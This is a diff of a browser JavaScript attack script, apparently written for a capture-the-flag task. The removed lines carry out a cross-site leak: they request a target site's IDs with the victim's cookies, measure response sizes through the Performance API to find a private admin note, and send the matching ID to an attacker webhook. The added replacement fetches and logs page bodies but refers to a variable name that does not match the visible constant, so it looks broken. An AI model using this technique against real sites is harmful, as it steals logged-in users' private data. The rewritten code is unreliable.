@@ -10,30 +10,22 @@ const THRESHOLD = 1000;
 
 let current = START_ID;
 let active = false;
-
-function tryId(id) {
-    if (active) return;
-    active = true;
-
-    const url = TARGET + id;
-    fetch(url, { mode: 'no-cors', credentials: 'include' });
-
-    setTimeout(() => {
-        const entries = performance.getEntriesByName(url);
-        let size = 0;
-        if (entries.length > 0) {
-            size = entries[0].transferSize;
-            performance.clearResourceTimings();
-        }
-
-        if (size > THRESHOLD) {
-            fetch(WEBHOOK + "?admin_note=" + id);
-            return;
-        }
-
-        active = false;
-        if (id < MAX_ID) tryId(id + 1);
-    }, 200);
+    
+async function tryId(id) {
+  try {
+    const response = await fetch(target + id);
+    
+    if (!response.ok) {
+      console.log(`HTTP error: ${response.status}`);
+      return;
+    }
+    
+    const bodyText = await response.text();
+    
+    console.log(bodyText);
+  } catch (error) {
+    console.error("Fetch failed:", error);
+  }
 }
 
 tryId(current);
